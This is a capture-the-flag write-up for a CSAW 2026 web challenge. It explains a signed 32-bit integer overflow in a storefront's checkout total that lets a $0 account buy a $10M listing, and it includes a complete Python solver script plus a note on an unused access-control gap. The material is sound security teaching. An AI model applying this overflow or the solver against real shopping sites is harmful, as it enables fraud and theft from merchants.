# CSALE Revenge — CSAW 2026 (Web)

- **Event:** CSAW 2026 (CSAW26)
- **Category:** Web
- **Flag format:** `csawctf{...}`
- **Author:** Talel (writeup based on the CSAW26 challenge)

---

## Summary

CSALE Revenge is the correctly-deployed version of the CSALE storefront. The Python source is **byte-identical** to the beta release, but the deployment differences in the beta made the intended path unsolvable there. The intended solve is a **signed 32-bit integer overflow** in the checkout math: buying a tiny quantity of a $10,000,000 listing wraps the total to a negative number, bypassing the balance checks and yielding the flag in the order's fulfillment note.

---

## Vulnerability

The checkout function computes the cart total using a `signed_32()` helper:

```python
def signed_32(value):
    value &= 0xFFFFFFFF
    return value - 0x100000000 if value & 0x80000000 else value

# in checkout():
total = signed_32(sum(x["price_cents"] * x["quantity"] for x in items))
```

Listing 9 is titled "Flag" and is sold by `superdiscreteflaguser` for:

```
$10,000,000  ->  1,000,000,000 cents
```

`add_to_cart` clamps quantity to a maximum of 25. Quantity 3 is already enough to overflow a signed 32-bit integer:

```
3 * 1,000,000,000 = 3,000,000,000
3,000,000,000 > 2,147,483,648 (2^31)
signed_32(3,000,000,000) = -1,294,967,296
```

The balance guards then both pass on a fresh $0 account:

```python
if total > balance or balance - total < 0:
    # -1,294,967,296 > 0       -> False
    # 0 - (-1,294,967,296) < 0 -> False
    return redirect("/cart?error=funds")
```

Checkout succeeds. The order snapshot copies the listing's `fulfillment_note`, which contains the flag.

---

## Exploit

```python
#!/usr/bin/env python3
"""
CSALE Revenge solver — CSAW 2026 web challenge.

Abuses a signed 32-bit integer overflow in checkout() to buy a $10M flag
listing with a $0 balance. The flag is returned in the order detail page.
"""
import sys
import re
import html
import secrets
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"


def main():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    username = "t" + secrets.token_hex(4)
    password = "Passw0rd!123"

    print(f"[*] signing up {username}")
    s.post(f"{BASE}/signup", data={"username": username, "password": password}, timeout=20)

    print("[*] adding listing 9 x3 to cart")
    s.post(f"{BASE}/cart/items", data={"listing_id": 9, "quantity": 3}, timeout=20)

    r = s.get(f"{BASE}/cart", timeout=20)
    print("[*] cart total shown:", re.findall(r'\$[\d,\.\-]+', re.sub(r'<[^>]+>', ' ', r.text))[:6])

    print("[*] checking out")
    r = s.post(f"{BASE}/cart/checkout", timeout=30, allow_redirects=False)
    print(f"    -> {r.status_code} {r.headers.get('Location')}")

    r = s.get(f"{BASE}/account/orders", timeout=20)
    order_ids = sorted(set(int(x) for x in re.findall(r'/orders/(\d+)', r.text)))
    print(f"[*] orders: {order_ids}")

    for oid in order_ids:
        d = s.get(f"{BASE}/orders/{oid}", timeout=20).text
        txt = html.unescape(re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', d)))
        m = re.search(r'csawctf\{[^}]*\}', txt)
        if m:
            print(f"[+] order {oid}: {m.group(0)}")
        else:
            print(f"[-] order {oid}: no flag found")


if __name__ == "__main__":
    main()
```

---

## Second bug (not needed)

The challenge bundle notes an additional access-control issue:

- `/<slug>/preview` and the GET side of `/<slug>/unlock` do not check ownership.
- `draft_file()` searches `PRIVATE_LISTING_IMAGE_DIR`, which contains the otherwise-unreachable `FLAG_IMAGE_PATH`.

In practice this path is unexploitable because draft slugs are private and no route lists another user's drafts. The integer overflow is the intended and reliable solve.

---

## Flag

```
csawctf{REDACTED}
```

---

## Files

- `solve.py` — full solver for the integer-overflow path.
